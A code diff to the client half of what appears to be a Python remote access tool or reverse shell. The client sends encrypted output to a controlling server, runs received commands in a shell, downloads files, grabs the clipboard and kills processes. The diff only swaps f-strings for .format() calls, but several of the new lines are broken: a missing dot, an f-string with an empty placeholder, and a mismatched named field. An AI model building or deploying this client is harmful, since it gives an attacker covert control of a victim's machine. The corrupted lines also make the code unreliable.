@@ -36,7 +36,7 @@ try:
     commands += '- zip {file} ( Zips a file)\n'
     _zipfile = True
 except Exception as e:
-    logging.debug(f'zipfile import error: {e}')
+    logging.debug('zipfile import error: {}'.format(e))
     _zipfile = False
 
 def shell(q, data):
@@ -112,12 +112,12 @@ class Client(object):
 
     def print_output(self, output_str : str, add_cwd = True):
         """ Prints command output """
-        logging.debug(f'Sending data:{output_str}')
+        logging.debug('Sending data:{}'.format(output_str))
         if add_cwd:
             output_str = output_str + str(os.getcwd()) + '> '
         sent_message = self.Crypt.encrypt(output_str.encode())
         self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
-        logging.debug(f'Sending Encypted data: {sent_message}')
+        logging.debug('Sending Encypted data: {}'.format(sent_message))
         return
 
 
@@ -144,15 +144,15 @@ class Client(object):
                 if thr[0].is_alive():
                     if thr[0].pid == pid:
                         thr[0].terminate()
-                        return f"Killed PID:{pid} Successfully"
+                        return "Killed PID:{} Successfully".format(pid)
                 else:
                     self.Threads.remove(thr)
-            return f"PID: {pid} is invalid or is already killed"
+            return "PID: {} is invalid or is already killed".format(pid)
         if data[:7].lower() == 'threads':
             return_threads = "Threads:\n\n"
             for thr in self.Threads:
                 if thr[0].is_alive():
-                    return_threads += f"PID: {thr[0].pid} - {thr[1]}"
+                    return_threads += "PID: {} - {thr[1]}".format(thr[0].pid)
                 else:
                     self.Threads.remove(thr)
             return return_threads
@@ -164,7 +164,7 @@ class Client(object):
                     with open(filename, 'wb') as f:
                         shutil.copyfileobj(r.raw, f)
             except Exception as e:
-                return f"Error downloading file {e}"
+                return "Error downloading file {}".format(e)
             return 'Downloaded {0} successfully.'.format(filename)
         if data[:9].lower() == 'key/gclip':
             if _pyperclip:
@@ -179,13 +179,13 @@ class Client(object):
             if _zipfile:
                 output_file = os.path.splitext(data[4:])[0] + ".zip"
                 zipfile.ZipFile(os.path.splitext(data[4:])[0] + ".zip", mode='w').write(data[4:])
-                return f"{data[4:]} zipped to {output_file}"
+                return "{} zipped to {}".format(data[4:], output_file)
             return "zip not avaliable: zipfile import failed"
         if data[:5].lower() == 'unzip':
             if _zipfile:
                 with zipfile.ZipFile(data[6:], 'r') as f:
                     f.extractall(pathlib.Path().absolute())
-                return f"Extracted {data[6:]} to {pathlib.Path().absolute()}"
+                return "Extracted {} to {}".format(data[6:], pathlib.Path().absolute())
             return "unzip not avaliable: zipfile import failed"
         return None
 
@@ -198,17 +198,17 @@ class Client(object):
             logging.error('Could not start communication with server: %s\n' %str(e))
             return
         cwd = self.Crypt.encrypt(str(os.getcwd() + '> ').encode())
-        logging.debug(f'Sending data: {cwd}')
+        logging.debug('Sending data: {}'.format(cwd))
         self.socket.send(struct.pack('>I', len(cwd)) + cwd)
         while True:
             output_str = None
             data = self.socket.recv(20480)
-            logging.debug(f'Received data: {data}')
+            logging.debug('Received data: {}'.format(data))
             try:
                 data = self.Crypt.decrypt(data)
-                logging.debug(f'Decrypted data: {data}')
+                logging.debug('Decrypted data: {}'format(data))
             except Exception as e:
-                logging.error(f"Decryption Error: {e}")
+                logging.error(f"Decryption Error: {}".format(e))
                 break
             if data == b' ':
                 self.print_output('')
@@ -220,7 +220,7 @@ class Client(object):
             try:
                 output_str = self.check_custom_commands(data)
             except Exception as e:
-                output_str = f"Custom command failed: {e}"
+                output_str = "Custom command failed: {}".format(e)
             if (output_str == None) and len(data) > 0:
 
                 self.Threads.append((Process(target=shell, args=(self.q, data)), data))
